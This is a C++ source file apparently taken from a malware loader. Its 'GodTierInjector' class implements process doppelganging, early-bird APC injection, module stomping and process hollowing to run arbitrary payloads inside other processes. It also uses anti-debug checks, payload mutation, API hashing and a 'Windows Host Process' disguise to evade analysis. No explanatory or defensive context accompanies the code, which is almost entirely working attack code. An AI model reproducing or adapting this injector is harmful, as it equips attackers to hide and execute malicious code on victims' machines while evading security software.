// ==================== MAP PE ====================
bool GodTierInjector::MapPEIntoProcess(HANDLE hProcess, PVOID newBase, 
                                       const std::vector<uint8_t>& peData, PVOID& entryPoint)
{
    auto dos = (PIMAGE_DOS_HEADER)peData.data();
    auto nt  = (PIMAGE_NT_HEADERS)(peData.data() + dos->e_lfanew);

    g_NtWriteVirtualMemory(hProcess, newBase, peData.data(), 
                           nt->OptionalHeader.SizeOfHeaders, nullptr);

    auto section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData == 0) continue;

        PVOID dest = (PVOID)((ULONG_PTR)newBase + section[i].VirtualAddress);
        const void* src = peData.data() + section[i].PointerToRawData;
        g_NtWriteVirtualMemory(hProcess, dest, (PVOID)src, section[i].SizeOfRawData, nullptr);
    }

    entryPoint = (PVOID)((ULONG_PTR)newBase + nt->OptionalHeader.AddressOfEntryPoint);
    return true;
}

// ==================== FIX RELOCATIONS ====================
bool GodTierInjector::FixRelocations(HANDLE hProcess, PVOID newBase, PVOID preferredBase) {
    BYTE headers[0x1000] = {0};
    SIZE_T read = 0;
    ReadProcessMemory(hProcess, newBase, headers, sizeof(headers), &read);

    auto dos = (PIMAGE_DOS_HEADER)headers;
    auto nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);

    DWORD relocRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (relocRVA == 0) return true;

    ULONG_PTR delta = (ULONG_PTR)newBase - (ULONG_PTR)preferredBase;
    PVOID current = (PVOID)((ULONG_PTR)newBase + relocRVA);

    while (true) {
        IMAGE_BASE_RELOCATION reloc = {};
        SIZE_T bytesRead = 0;
        ReadProcessMemory(hProcess, current, &reloc, sizeof(reloc), &bytesRead);
        if (reloc.VirtualAddress == 0) break;

        std::vector<WORD> entries((reloc.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD));
        ReadProcessMemory(hProcess, (PVOID)((ULONG_PTR)current + sizeof(IMAGE_BASE_RELOCATION)),
                          entries.data(), entries.size() * sizeof(WORD), nullptr);

        for (WORD entry : entries) {
            if (entry == 0) continue;

            WORD type = entry >> 12;
            WORD offset = entry & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                PVOID patchAddr = (PVOID)((ULONG_PTR)newBase + reloc.VirtualAddress + offset);
                ULONG_PTR value = 0;
                ReadProcessMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr);
                value += delta;
                g_NtWriteVirtualMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr);
            }
        }
        current = (PVOID)((ULONG_PTR)current + reloc.SizeOfBlock);
    }
    return true;
}

// ==================== SET PROCESS PARAMETERS ====================
bool GodTierInjector::SetProcessParameters(HANDLE hProcess,
                                           const std::wstring& imagePath,
                                           const std::wstring& commandLine,
                                           const std::wstring& currentDirectory,
                                           const std::wstring& windowTitle)
{
    using RtlCreateProcessParametersEx_t = NTSTATUS(NTAPI*)(
        PRTL_USER_PROCESS_PARAMETERS*,
        PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING,
        PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);

    auto RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)
        ApiObfuscation::GetProcAddressByHash(GetModuleHandleA("ntdll.dll"),
            ApiObfuscation::HashApi("RtlCreateProcessParametersEx"));

    if (!RtlCreateProcessParametersEx) return false;

    UNICODE_STRING uImage, uCmd, uCurDir, uTitle;
    RtlInitUnicodeString(&uImage, imagePath.c_str());
    RtlInitUnicodeString(&uCmd, commandLine.c_str());

    std::wstring curDir = currentDirectory.empty() ? L"C:\\Windows\\System32" : currentDirectory;
    RtlInitUnicodeString(&uCurDir, curDir.c_str());

    std::wstring title = windowTitle.empty() ? imagePath : windowTitle;
    RtlInitUnicodeString(&uTitle, title.c_str());

    PRTL_USER_PROCESS_PARAMETERS params = nullptr;

    NTSTATUS status = RtlCreateProcessParametersEx(
        &params, &uImage, nullptr, &uCurDir, &uCmd,
        nullptr, &uTitle, nullptr, nullptr, nullptr, 0);

    if (!NT_SUCCESS(status) || !params) return false;

    PVOID remoteParams = nullptr;
    SIZE_T size = params->Length + 0x1000;

    status = g_NtAllocateVirtualMemory(hProcess, &remoteParams, 0, &size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return false;

    g_NtWriteVirtualMemory(hProcess, remoteParams, params, params->Length, nullptr);

    PROCESS_BASIC_INFORMATION pbi = {};
    // g_NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    if (pbi.PebBaseAddress) {
        PVOID paramPtr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x20);
        g_NtWriteVirtualMemory(hProcess, paramPtr, &remoteParams, sizeof(PVOID), nullptr);
    }

    return true;
}

// ==================== DOPPELGANGING ====================
bool GodTierInjector::DoppelgangingInject(const std::wstring& targetPath,
                                          const std::vector<uint8_t>& rawData,
                                          bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    auto dos = (PIMAGE_DOS_HEADER)payload.data();
    auto nt  = (PIMAGE_NT_HEADERS)(payload.data() + dos->e_lfanew);

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) return false;

    HANDLE hFile = CreateFileTransactedW(
        L"C:\\Windows\\Temp\\doppel_temp.bin",
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
        nullptr, hTransaction, nullptr, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hTransaction);
        return false;
    }

    DWORD written = 0;
    WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, nullptr);

    HANDLE hSection = nullptr;
    LARGE_INTEGER maxSize = { (LONGLONG)payload.size() };

    NTSTATUS status = g_NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, nullptr, &maxSize,
        PAGE_READONLY, SEC_IMAGE, hFile);

    if (!NT_SUCCESS(status)) {
        CloseHandle(hFile);
        CloseHandle(hTransaction);
        return false;
    }

    RollbackTransaction(hTransaction);
    CloseHandle(hFile);
    CloseHandle(hTransaction);

    HANDLE hProcess = nullptr;
    status = g_NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        nullptr,
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        hSection,
        nullptr,
        nullptr,
        FALSE
    );

    if (!NT_SUCCESS(status)) {
        CloseHandle(hSection);
        return false;
    }

    FixRelocations(hProcess, (PVOID)nt->OptionalHeader.ImageBase,
                   (PVOID)nt->OptionalHeader.ImageBase);

    PVOID imageBase  = (PVOID)nt->OptionalHeader.ImageBase;
    PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + nt->OptionalHeader.AddressOfEntryPoint);

    HANDLE hThread = nullptr;
    status = g_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        entryPoint,
        nullptr,
        FALSE,
        0, 0, 0,
        nullptr
    );

    CloseHandle(hSection);

    if (!NT_SUCCESS(status)) {
        CloseHandle(hProcess);
        return false;
    }

    SetProcessParameters(hProcess, targetPath, targetPath,
                         L"C:\\Windows\\System32", L"Windows Host Process");

    g_NtResumeThread(hThread, nullptr);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

// ==================== EARLY BIRD ====================
bool GodTierInjector::EarlyBirdInject(const std::wstring& targetPath,
                                      const std::vector<uint8_t>& rawData,
                                      bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    bool success = false;

    do {
        PVOID remoteMemory = nullptr;
        SIZE_T regionSize = payload.size();

        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &remoteMemory, 0, &regionSize,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;

        if (!NT_SUCCESS(g_NtWriteVirtualMemory(pi.hProcess, remoteMemory, 
                                               (PVOID)payload.data(), payload.size(), nullptr))) break;

        ULONG oldProtect = 0;
        if (!NT_SUCCESS(g_NtProtectVirtualMemory(pi.hProcess, &remoteMemory, &regionSize,
                                                 PAGE_EXECUTE_READ, &oldProtect))) break;

        if (!NT_SUCCESS(g_NtQueueApcThread(pi.hThread, (PAPCFUNC)remoteMemory, 
                                           nullptr, nullptr, nullptr))) break;

        g_NtResumeThread(pi.hThread, nullptr);
        success = true;

    } while (false);

    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);

    return success;
}

// ==================== MODULE STOMPING ====================
bool GodTierInjector::ModuleStompingInject(const std::wstring& legitimateDllPath,
                                           const std::vector<uint8_t>& rawData,
                                           bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    HMODULE hModule = LoadLibraryW(legitimateDllPath.c_str());
    if (!hModule) return false;

    bool success = false;

    do {
        auto dos = (PIMAGE_DOS_HEADER)hModule;
        auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
        auto section = IMAGE_FIRST_SECTION(nt);

        PVOID textSection = nullptr;
        SIZE_T textSize = 0;

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                textSection = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
                textSize = section[i].Misc.VirtualSize;
                break;
            }
        }

        if (!textSection || payload.size() > textSize) break;

        PVOID baseAddr = textSection;
        SIZE_T regionSize = textSize;
        ULONG oldProtect = 0;

        if (!NT_SUCCESS(g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                                 PAGE_READWRITE, &oldProtect))) break;

        g_NtWriteVirtualMemory(GetCurrentProcess(), textSection, 
                               (PVOID)payload.data(), payload.size(), nullptr);

        baseAddr = textSection;
        regionSize = textSize;
        g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                 PAGE_EXECUTE_READ, &oldProtect);

        success = true;

    } while (false);

    return success;
}

// ==================== PROCESS HOLLOWING ====================
bool GodTierInjector::ProcessHollowingInject(const std::wstring& targetPath,
                                             const std::vector<uint8_t>& rawData,
                                             bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    bool success = false;

    do {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) break;

        PVOID oldBase = nullptr;
        PVOID remotePeb = (PVOID)ctx.Rdx;
        if (!ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remotePeb + 0x10), 
                               &oldBase, sizeof(PVOID), nullptr)) break;

        if (!NT_SUCCESS(g_NtUnmapViewOfSection(pi.hProcess, oldBase))) break;

        PVOID newBase = nullptr;
        SIZE_T regionSize = payload.size() + 0x2000;
        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &regionSize,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;

        PVOID entryPoint = nullptr;
        if (!MapPEIntoProcess(pi.hProcess, newBase, payload, entryPoint)) break;

        auto dos = (PIMAGE_DOS_HEADER)payload.data();
        auto nt  = (PIMAGE_NT_HEADERS)(payload.data() + dos->e_lfanew);
        if (!FixRelocations(pi.hProcess, newBase, (PVOID)nt->OptionalHeader.ImageBase)) break;

        PVOID imageBaseAddr = (PVOID)((ULONG_PTR)remotePeb + 0x10);
        g_NtWriteVirtualMemory(pi.hProcess, imageBaseAddr, &newBase, sizeof(PVOID), nullptr);

        ctx.Rcx = (ULONG_PTR)entryPoint;
        SetThreadContext(pi.hThread, &ctx);

        g_NtResumeThread(pi.hThread, nullptr);
        success = true;

    } while (false);

    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);

    return success;
}

// ==================== EXECUTE STOMPED MODULE ====================
bool GodTierInjector::ExecuteStompedModule(PVOID address, bool wait) {
    if (!address) return false;

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)address, nullptr, 0, nullptr);
    if (!hThread) return false;

    if (wait) WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}
